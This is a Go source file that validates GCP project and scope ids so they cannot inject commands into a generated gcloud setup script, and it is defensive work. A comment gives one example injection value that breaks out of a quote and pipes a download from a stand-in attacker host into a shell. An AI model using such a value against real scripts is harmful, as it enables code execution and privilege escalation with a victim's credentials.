package gcp

import (
	"fmt"
	"regexp"
)

// Identifier validation for values that reach the generated setup script.
//
// WHY THIS EXISTS. setup-reader.sh is rendered with text/template, which
// escapes nothing, and the customer runs the result in a shell that is already
// authenticated to gcloud. Two of its inputs come straight off a query string:
//
//	READER_PROJECT_ID="{{.ReaderProjectID}}"        <- inside double quotes
//	gcloud ... add-iam-policy-binding {{.ScopeID}}  <- command position
//
// A scope id of `x" ; curl evil.sh | sh ; #` closes the quote and appends a
// command. The endpoint that renders the script requires only `discovery:read`,
// so the author of that string need not be the person who runs it: a read-only
// member crafts it, an admin downloads the script and executes it. That is a
// privilege escalation with the customer's own gcloud credentials.
//
// Validating at the boundary is the right fix rather than shell-quoting inside
// the template. These are Google identifiers with published grammars, so
// anything failing these patterns is malformed input rather than a value we
// should be escaping and passing on. Rejecting also keeps the generated script
// readable, which matters because a customer is expected to audit it before
// running it.
var (
	// A GCP project id: 6-30 chars, lowercase letter first, letters/digits/
	// hyphens, not ending in a hyphen.
	projectIDPattern = regexp.MustCompile(`^[a-z][a-z0-9-]{4,28}[a-z0-9]$`)
	// Organization and folder ids are decimal numbers. Bounded so an absurd
	// string cannot be pushed through as a "number".
	numericIDPattern = regexp.MustCompile(`^[0-9]{1,32}$`)
)

// ValidateProjectID checks a value used as a GCP project id.
func ValidateProjectID(field, v string) error {
	if !projectIDPattern.MatchString(v) {
		return fmt.Errorf("%s %q is not a valid GCP project id: 6-30 characters, "+
			"starting with a lowercase letter, containing only lowercase letters, "+
			"digits and hyphens, and not ending in a hyphen", field, v)
	}
	return nil
}

// ValidateScopeID checks a scope id against the grammar for its kind. An
// unknown kind is rejected rather than waved through, so a new scope kind
// cannot silently bypass validation by not being listed here.
func ValidateScopeID(scopeKind, v string) error {
	switch scopeKind {
	case "project", "":
		return ValidateProjectID("scope_id", v)
	case "org", "organization", "folder":
		if !numericIDPattern.MatchString(v) {
			return fmt.Errorf("scope_id %q is not a valid %s id: expected digits only",
				v, scopeKind)
		}
		return nil
	default:
		return fmt.Errorf("unsupported scope_kind %q", scopeKind)
	}
}
